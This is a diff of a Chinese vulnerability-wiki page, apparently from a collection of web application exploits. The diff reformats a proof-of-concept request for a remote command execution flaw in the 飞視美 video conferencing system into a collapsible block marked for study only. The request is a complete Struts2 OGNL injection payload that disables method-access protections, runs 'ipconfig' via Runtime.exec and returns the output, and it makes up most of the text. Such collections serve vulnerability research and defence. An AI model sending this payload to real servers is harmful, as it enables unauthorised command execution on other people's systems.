@@ -41,16 +41,19 @@ app="飞视美-视频会议系统"
 
 发送请求包
 
-```
-POST /confinfoaction!showallConfinfos.action HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /confinfoaction!showallConfinfos.action HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 669
 Host: 
 Connection: Keep-Alive
 
-('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ipconfig\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
-```
+('\43_memberAccess.allowStaticMethodAccess')(a)=true&amp;(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&amp;('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&amp;(g)(('\43mycmd\75\'ipconfig\'')(d))&amp;(h)(('\43myret\75@java.lang.Runtime@getRuntime().&#101;xec(\43mycmd)')(d))&amp;(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&amp;(j)(('\43myres\75new\40byte[51020]')(d))&amp;(k)(('\43mydat.readFully(\43myres)')(d))&amp;(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&amp;(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&amp;(n)(('\43myout.getWriter().println(\43mystr)')(d))</code></pre>
+
+</details>
 
 ![image-20220525152728933](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251527012.png)
 
